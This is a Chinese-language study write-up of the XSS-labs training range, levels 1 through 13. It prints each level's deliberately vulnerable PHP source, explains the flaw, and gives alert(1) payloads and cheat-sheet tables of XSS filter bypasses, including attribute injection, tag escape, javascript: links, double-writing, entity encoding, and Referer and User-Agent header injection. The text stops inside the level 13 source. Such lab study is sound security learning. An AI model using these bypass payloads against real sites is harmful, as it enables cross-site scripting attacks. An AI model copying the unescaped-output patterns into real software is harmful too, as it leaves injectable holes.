---
title: "Xss-labs通关全解&&XSS笔记"
publishDate: 2025-12-26 18:37:00
description: "分析以及笔记"
tags: ["XSS", "笔记", "Web"]
language: "中文"

---

> 初学者学习并且参考整理的笔记，仅供参考，非专业人员，难免有疏忽，借鉴他人，AI辅助之处，见谅。
> 
> 我选择直接使用源码呈现（正常情况下是无法看到完整源码的，只能看到页面源码）,一方面是省去试错payload所占用的篇幅，另一方面也是为了日后温习时能更加直观，不需要再挂其他的了，我觉得大部分过滤的方法都可以被试出来，多输入几次总归可以。（好吧，其实我觉得也没人看，自己复习用得了。）

## 第一关

 源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.从上往下分析，可以看到`window.alert`被自定义函数重写。

```php
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
```

2.可以看到在html代码里插入了php代码段。

```php
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```

其中`ini_set("display_errors", 0)`;用于忽略报错信息

然后通过get请求获得了**name**的值赋给了str

```php
echo "<h2 align=center>欢迎用户".$str."</h2>";
```

很显然这里就是我们的注入点，直接将传入的值插入，没有进行任何过滤。

3.那么我们就可以很简单的构造payload

```html
?name=<script>alert(1)</script> //这里 alert()里面随便写什么都行
```

### 执行js代码的几种方式

| **方式**    | **Payload 示例**                 | **适用场景**             | **备注**         |
| --------- | ------------------------------ | -------------------- | -------------- |
| **标准标签**  | `<script>alert(1)</script>`    | 无过滤，直接输出             | 最容易被拦截         |
| **图片报错**  | `<img src=1 onerror=alert(1)>` | 过滤了 `<script>`       | **实战最常用**，自动触发 |
| **交互事件**  | `<div onmouseover=alert(1)>`   | 过滤了 `src` 或 `script` | 需要诱导用户操作       |
| **伪协议**   | `<a href=javascript:alert(1)>` | 注入点在 `a` 标签内部        | 常见于点击链接处       |
| **SVG标签** | `<svg/onload=alert(1)>`        | 现代浏览器，过滤 `img`       | HTML5 新特性      |

## 第二关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.可以看到呢核心最终还是触发alert方法

2.局部聚焦于htmlspecialchars函数，可以看到h2标签无法作为注入点使用，原因如下。

### htmlspecialchars

**.htmlspecialchars** 方法 它的作用是把**预定义的字符**转换为 **HTML 实体**。简单来说，就是把具有“功能性”的代码符号，变成了纯粹的“文本显示符号”。浏览器看到实体后，只会把它显示出来，而不会把它当作代码去执行。

| **输入字符** | **转换后的实体** | **含义**                    |
| -------- | ---------- | ------------------------- |
| `&`      | `&amp;`    | 和号                        |
| `"`      | `&quot;`   | **双引号** (重点)              |
| `<`      | `&lt;`     | 小于号 (直接杀死了 `<script>` 标签) |
| `>`      | `&gt;`     | 大于号                       |

默认情况下（在 PHP 8.1 之前），它不转换单引号 (`'`)！

这个函数的完整语法其实是： `htmlspecialchars(string, flags, encoding)`

这里的 `flags` 参数决定了它的防御等级：

* **`ENT_COMPAT` (旧版默认值):** 转换双引号，**保留单引号**。

* **`ENT_QUOTES`:** 同时转换双引号和单引号。

* **`ENT_NOQUOTES`:** 都不转换。

开发者在调用时往往懒省事，只写 `htmlspecialchars($str)`，没加 `ENT_QUOTES` 参数。 **这就给了我们用“单引号”进行闭合绕过的机会。**

3.注入点

```html
<input name=keyword  value="'.$str.'">
```

依旧是直接拼接（在输入框中），这里的`input` 是不安全的，分析可知 我们可以通过提前闭合 value=后的第一个`"` 进而插入

4.我们就可以构造最简单的payload，插入的可以选择`input`的属性

```php
" onclick="alert(1) //注意这里alert(1)前只有一个"因为要和后面的"闭合，以及空格
```

如果只是想过关，到这里也就结束了，下面的是更多样化的选择。

同样的，我们也可以选择其他的属性

### `<input>` 标签 XSS 触发属性速查表

| **属性 (Attribute)**     | **触发条件 (Trigger Condition)** | **构造示例 (Payload)**                 | **CTF/实战 推荐指数 & 评价**                                                           |
| ---------------------- | ---------------------------- | ---------------------------------- | ------------------------------------------------------------------------------ |
| **`onfocus`**          | **当输入框获得焦点时触发**。             | `" onfocus=alert(1) autofocus="`   | 加上 `autofocus` 属性后，页面加载完成后会自动聚焦，实现 **“无交互 (Zero-click)”** 自动触发 XSS。但是容易卡死，死循环。 |
| **`onmouseover`**      | **当鼠标指针移动到输入框上方时触发**。        | `" onmouseover=alert(1) "`         | 需要用户鼠标划过。如果输入框很大或者位置很显眼，成功率尚可，但不如自动触发稳。                                        |
| **`onclick`**          | **当用户点击输入框时触发**。             | `" onclick=alert(1) "`             | 需要用户主动点击。这是最被动的方式，除非你配合社工诱导用户去点击。                                              |
| **`oninput`**          | **当用户在输入框内输入/修改内容时触发**。      | `" oninput=alert(1) "`             | 需要用户进行输入操作。通常用于搜索框等用户必须打字的场景。                                                  |
| **`onchange`**         | **当内容改变且失去焦点时触发**。           | `" onchange=alert(1) "`            | 比较难触发，既要改内容，又要点别的地方，条件太苛刻。                                                     |
| **`onblur`**           | **当输入框失去焦点时触发**。             | `" onblur=alert(1) autofocus="`    | 可以配合 `autofocus`，一旦用户点击页面的其他地方（失去焦点），就会触发。                                     |
| **`oncut` / `oncopy`** | **当用户剪切/复制输入框内容时触发**。        | `" value="点我复制" oncopy=alert(1) "` | 非常特定的场景才有用（例如诱导用户复制某些兑换码）。                                                     |

> 注意这里"前后基本上都有个空格

这里关于`"` 闭合的情况还可以有其他的样式，具体可看表格

| **写法类型**           | **示例**               | **规则与限制**                    |
| ------------------ | -------------------- | ---------------------------- |
| **双引号包裹**          | `onclick="alert(1)"` | 最标准写法。值里面可以包含空格、单引号。         |
| **单引号包裹**          | `onclick='alert(1)'` | 标准写法。值里面可以包含空格、双引号。          |
| **无引号 (Unquoted)** | `onclick=alert(1)`   | **只要值里面不包含“破坏性字符”，就可以不加引号。** |

“破坏性字符” 是什么？

如果你想使用 **无引号** 写法（`onclick=payload`），你的 Payload 里面**绝对不能包含**以下字符，否则 HTML 解析器会认为属性值结束了：

* **空格** (最关键的限制)

* `"` (双引号)

* `'` (单引号)

* `=` (等号)

* `<` (小于号)

* `>` (大于号)

* `` ` `` (反引号)

这一关也比较简单没有对input内的进行转义，还可以考虑 **标签逃逸** 和 **伪协议** 

### 标签逃逸

后端**没有**转义/过滤尖括号 `<` 和 `>`。 **攻击原理**：利用 `>` 强制结束当前的 `<input>` 标签，然后自由插入新的 HTML 标签。

| **攻击变种**           | **适用场景 (Condition)**             | **构造示例 (Payload)**                      | **原理解析**                                                      |
| ------------------ | -------------------------------- | --------------------------------------- | ------------------------------------------------------------- |
| **直接插入 Script**    | 最理想的情况，后端只检查了引号闭合，完全没管标签。        | `"> <script>alert(1)</script>`          | 1. `">` 闭合原 input。<br>2. 浏览器解析执行完整的 JS 脚本块。                   |
| **利用 img/svg**     | 后端过滤了 `<script>` 关键字，但没过滤 `< >`。 | `"> <img src=x onerror=alert(1)>`       | 1. `">` 闭合原 input。<br>2. 利用图片加载失败（src=x）触发 `onerror` 事件执行 JS。 |
| **利用 body/iframe** | 需要更隐蔽或特定上下文，或者 `img` 标签也被监控时。    | `"> <iframe onload=alert(1)>`           | 1. `">` 闭合原 input。<br>2. iframe 加载完成时触发 `onload`。             |
| **利用 input (递归)**  | 你想弹窗，但不想破坏页面结构，看起来像个正常的框。        | `"> <input onfocus=alert(1) autofocus>` | 1. `">` 闭合原 input。<br>2. 插入一个新的、自带攻击属性的 input 标签。还是有可能会死循环    |

### 伪协议与特殊 Type

无法使用 `<script>` 标签，且常见的 `on*` 事件（如 `onclick`, `onmouseover`）被 WAF 过滤，但允许修改 `type` 属性或 URL 相关的属性。 **攻击原理**：利用浏览器支持 `javascript:` 伪协议的特性，将 JS 代码伪装成链接或表单提交目标。

| **攻击变种**          | **适用场景 (Condition)**                           | **构造示例 (Payload)**                                 | **原理解析**                                                                                                                         |
| ----------------- | ---------------------------------------------- | -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **表单劫持 (Submit)** | 这是一个输入框，但你可以改变它的 `type` 为 `submit`。            | `" type="submit" formaction="javascript:alert(1)"` | 1. `type="submit"` 把输入框变身成提交按钮。<br>2. `formaction` 覆盖了原本 form 的 action 地址。<br>3. 点击按钮 -> 浏览器尝试跳转到 `javascript:alert(1)` -> 代码执行。 |
| **图片按钮 (Image)**  | 另一种将 input 变为按钮的方式 (较老但在部分浏览器有效)。              | `" type="image" src="javascript:alert(1)"`         | 1. `type="image"` 把它变成图片按钮。<br>2. 点击图片时尝试执行 src 中的伪协议代码。<br>_(注：现代浏览器对此防御较严，成功率低于 formaction)_                                   |
| **超链接劫持 (A标签)**   | **(延伸)** 如果你的输入是在 `<a href="...">` 中而不是 input。 | `" href="javascript:alert(1)"`                     | 1. 直接闭合前面的引号。<br>2. 点击链接直接触发 JS。<br>_(常用于 href 属性注入场景)_                                                                          |

### 绕过过滤

对这一关没必要且不适用

当简单的 `onclick` 或 `<script>` 被 WAF（防火墙）或后端代码无情地拦截、替换或删除时。

| **技巧 (Technique)**               | **适用场景 (Condition)**                                     | **构造示例 (Payload)**                                                  | **原理解析 & 评价**                                                               |
| -------------------------------- | -------------------------------------------------------- | ------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| **大小写绕过**<br>(Case Sensitivity)  | 后端过滤代码**只匹配小写**。<br>例如：`str_replace("script", "", $str)` | `" OnIcK=alert(1) "<br>"> <ScRiPt>alert(1)</sCrIpT>`                | HTML 对标签和属性**不区分大小写**，但后端的过滤代码（PHP/Python/Java）可能是区分大小写的。                   |
| **双写绕过**<br>(Double Writing)     | 后端将敏感词**替换为空**，且**只替换一次**。<br>例如：把 `script` 替换为 `""`。    | `"> <scrscriptipt>alert(1)</script>`<br>`" oonnfocus=alert(1) "`    | 当中间的 `script` 被删掉后，左右剩下的字符自动拼合，正好重新组成了 `script`。                            |
| **HTML 实体编码**<br>(HTML Entity)   | 后端过滤了 `alert`、`(` 等特殊字符，但没过滤 `&` 和 `#`。                  | `" onclick=&#97;lert(1) "`<br>`" onclick=alert&#40;1&#41; "`        | 浏览器解析顺序：**HTML解码 -> JS执行**。浏览器看到 `&#97;` 会先把它还原成 `a`，然后再交给 JS 引擎执行 `alert`。 |
| **空格绕过**<br>(Space Bypass)       | 后端通过正则过滤了空格 ，导致无法分隔属性。                                   | `"onfocus=alert(1)autofocus="`<br>`"type="text"/onfocus=alert(1)/*` | HTML 解析器允许用 `/` (斜杠) 代替空格来分隔属性。                                             |
| **利用伪协议替换**<br>(Protocol Bypass) | `javascript:` 关键字被过滤。                                    | `" type="submit" formaction="java&#115;cript:alert(1)"`             | 利用 HTML 实体编码打断关键字，`&#115;` 是 `s`，浏览器解码后依然能认出这是 `javascript:`。               |
| **等效函数替换**<br>(Function Sub)     | `alert()` 函数被精准封杀。                                       | `confirm(1)`<br>`prompt(1)`<br>`top['al'+'ert'](1)`                 | 弹窗不一定要用 `alert`，`confirm` 和 `prompt` 也是弹窗。或者利用 JS 的字符串拼接特性绕过关键字检测。          |

## 第三关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>    
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.还是触发`alert` 不多叙述了

2.可以看到跟第二关一样`echo` h2被 转义了

```php
<input name=keyword  value='".htmlspecialchars($str)."'>  
```

但是不同的是不像上一关`$str` 直接被传入，这一关经过了一层 `htmlspecialchars` 转义 [点击这里跳转到 htmlspecialchars](#htmlspecialchars)

这里我们使用的是其默认不转换单引号的特性，同时题目中也使用 `'` 对我们进行了暗示

剩下内容就和第二关默认的payload相似了

3.我们可以很简单的构造

```php
' onclick='alert(1) 
```

其他属性可以参照[这里](#input-标签-xss-触发属性速查表) 基本上只有单引号和双引号之间的区别
以及尝试[伪协议与特殊 Type](#伪协议与特殊-type) 大部分也可以

## 第四关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level5.php?keyword=find a way out!"; 
}
</script>
<title>欢迎来到level4</title>
</head>
<body>
<h1 align=center>欢迎来到level4</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level4.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>

```

1.触发`alert`

2.只是将`<` 和`>` 给过滤了，并且没有进行转义，可以利用`"`  进行闭合，这样就很好办了，可以接着无脑[属性闭环](#input-标签-xss-触发属性速查表)了

```php
" onclick ="alert(1) 
```

## 第五关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level6.php?keyword=break it out!"; 
}
</script>
<title>欢迎来到level5</title>
</head>
<body>
<h1 align=center>欢迎来到level5</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level5.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>


```

1.触发`alert`

2.这里强制把所有大写转换成了小写，证明我们无法使用大小写绕过了

```php
$str = strtolower($_GET["keyword"]);
```

3.可以看到这里把`<script` 替换成了 `<scr_ipt` 以及 把`on` 替换成了 `o_n`

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
```

3.这里我们可以结合[伪协议与特殊 Type](#伪协议与特殊-type) 以及 [标签逃逸](#标签逃逸), 我们就可以构造出

```php
"> <a href="javascript:alert(1)">点击通关</a>
```

4.这一关除了上面提到的源码中呈现的大小写替换以及其他替换（例如formaction中on被替换），还有一种类型payload问题在于浏览器的安全机制

利用图片类的标签，如 `<input type="image" src="javascript:alert(1)">` 或 `<img src="javascript:alert(1)">`代码成功绕过了所有 PHP 过滤，完整地发给了浏览器。

**但是**：

1. 浏览器看到标签是 `img` 或 `input type="image"`。

2. 浏览器认为：“这是一个静态资源（图片），它的 `src` 应该是一个 URL 地址。”

3. 浏览器**禁止**在图片资源的 `src` 属性中执行 JS 代码。

4. 浏览器尝试加载这个“图片”，发现加载不出来，于是显示一个裂图图标，**代码并未执行**。

也就是说在现代浏览器中，图片属性的 `src` 永远不会执行脚本。

`<a>`显然成为了最优解。

## 第六关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level7.php?keyword=move up!"; 
}
</script>
<title>欢迎来到level6</title>
</head>
<body>
<h1 align=center>欢迎来到level6</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>


```

1.可以看到这里的替换非常多且恐怖

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
```

但是可以注意到他少了上一关的转化为小写字母，那么就很简单了 [绕过过滤](#绕过过滤)

2.我们可以如下构造

```php
" Onclick="alert(1) //对特定关键字随意变换大小写即可
```

其他的略

## 第七关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level8.php?keyword=nice try!"; 
}
</script>
<title>欢迎来到level7</title>
</head>
<body>
<h1 align=center>欢迎来到level7</h1>
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>

```

1.可以看到这里是把第六关的大小写漏洞填上了，同时基本上把属性（属性的关键字母）给过滤了（替换成空格）

```php
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
```

2.[绕过过滤](#绕过过滤) 这样我们就可以考虑 双写绕过

比如说 `script``href` `onclick` 等都可以考虑并且使用

```php
" oonnclick="alert(1)
```

> 注意⚠️ 这里的双写绕过不是 ononclick 这样写，这样写几遍都无效的，目的是被空替代，然后让首尾相接

## 第八关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>

```

1.这一关的过滤基本上把之前的漏洞全填上了，大小写，关键词替换，甚至于`"`都被强制转义了

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

2.这一关的注入点不在于这里了原来输入框，而在于下方

```php
echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
```

输入 `$str7` 被直接放进了 `<a>` 标签的 `href` 属性里。 **这意味着：** 我们不需要“逃逸”闭合标签，我们本来就在一个可以执行 JS 的地方（`href` 属性支持 `javascript:` 伪协议）

而`href`有一个属性，会先进行**HTML 解码**，还原之后，再执行。

3.那么就可以构造出

```html
javasc&#114;ipt:alert(1)
```

### HTML 实体编码

主要针对的就是php不会进行html解码，进而绕过过滤，而例如`href`会自动进行解码

| **方法 (Method)** | **构造代码 (Payload)**                                                                                                 | **备注**                                            |
| --------------- | ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------- |
| **单字编码 (最推荐)**  | `javasc&#114;ipt:alert(1)`                                                                                         | 只改一个字母 `r`，最短最快。                                  |
| **首字编码**        | `java&#115;cript:alert(1)`                                                                                         | 只改一个字母 `s`。                                       |
| **插入 Tab 符**    | `javasc&#9;ript:alert(1)`                                                                                          | 利用 `&#9;` (Tab键) 打断单词。                            |
| **全部编码** <br>   | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;`<br>`&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;` | **第一行是** `javascript:`<br>**第二行是** `alert(1)`<br> |

## 第九关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level9</title>
</head>
<body>
<h1 align=center>欢迎来到level9</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```

1.可以看到，整体的思路和第八关是一样的，利用友情链接

2.但是这里多了判断，判断我们输入的链接是否合法，意味着上一关直接伪协议+编码是无效的

```php
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

分析一下可以知道，这里只是判断了传入的参数中 是否带有 `http://` 这一项，意味着我们可以在任何地方塞入

3.那么我们就可以在上一关基础上构造，利`//` 注释 使后续不生效

```php
javasc&#114;ipt:alert(1) // http://
```

换个思路想想，我们甚至可以不需要注释，直接塞到`alert()`之中,注意这里一定要使用`'`进行包裹

```php
javasc&#114;ipt:alert('http://')
```

## 第十关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level11.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level10</title>
</head>
<body>
<h1 align=center>欢迎来到level10</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level10.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.这一关只能靠传入参数的方式来构造payload，但问题出现了我们要给什么东西传参呢？

2.查看网页源码可以看到，有三个 `input`被隐藏了

```php
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
```

我们不妨对三个都传入参数，例如

```php
t_link=1&t_history=1&t_sort=1
```

由此可以发现注入点在`t_sort`

3.那么我们就可以和之前一样构造

```php
t_sort=" type="text" onclick="alert(1) 
```

| **障碍**              | **解决方法**                           |
| ------------------- | ---------------------------------- |
| **找不到注入点**          | 阅读源码（或盲猜），发现隐藏的 `t_sort` 参数。       |
| **过滤了 `< >`**       | 放弃标签逃逸，转向 **属性注入**（在标签内部添加属性）。     |
| **`type="hidden"`** | 注入 `type="text"` 覆盖原有属性，让元素显形以便交互。 |

## 第十一关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level12.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level11</title>
</head>
<body>
<h1 align=center>欢迎来到level11</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level11.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.这一关从源码分析来看全是烟雾弹（真实做题看不到源码能做出来真的很厉害了，反正我看到想不到）

```php
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ref"  value="'.$str33.'" type="hidden">
```

题目中给出的四个变量，往里传什么都没用........

2.题目的切入点就在于http请求头部分

```php
$str11=$_SERVER['HTTP_REFERER'];
```

后续内容可以看到只是进行了简单的对 `<` 和`>` 的过滤，那么我们就需要一些辅助工具了，例如**Hackbar** **BurpSuite**等

3.例如使用BurpSuite抓包后直接末尾加入

```
Referer: " onclick = alert(1) type="text
```

## 第十二关

源码展示

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level13.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level12</title>
</head>
<body>
<h1 align=center>欢迎来到level12</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_SERVER['HTTP_USER_AGENT'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_ua"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level12.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

1.和上一关很相似，只是把`referer`变成了`user agent`

2.依旧是BurpSuite抓包，找到`User-Agent`构造

```
User-Agent:" onclick = alert(1) type="text
```

## 第十三关

源码展示

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level14.php"; 
}
</script>
<title>欢迎来到level13</title>
</head>
<body>
<h1 align=center>欢迎来到level13</h1>
<?php 
setcookie("user", "call me maybe?", time()+3600);
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str00 = $_GET["t_sort"];
$str11=$_COOKIE["user"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.htmlspecialchars($str00).'" type="hidden">
<input name="t_cook"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level13.png></center>
<?php 
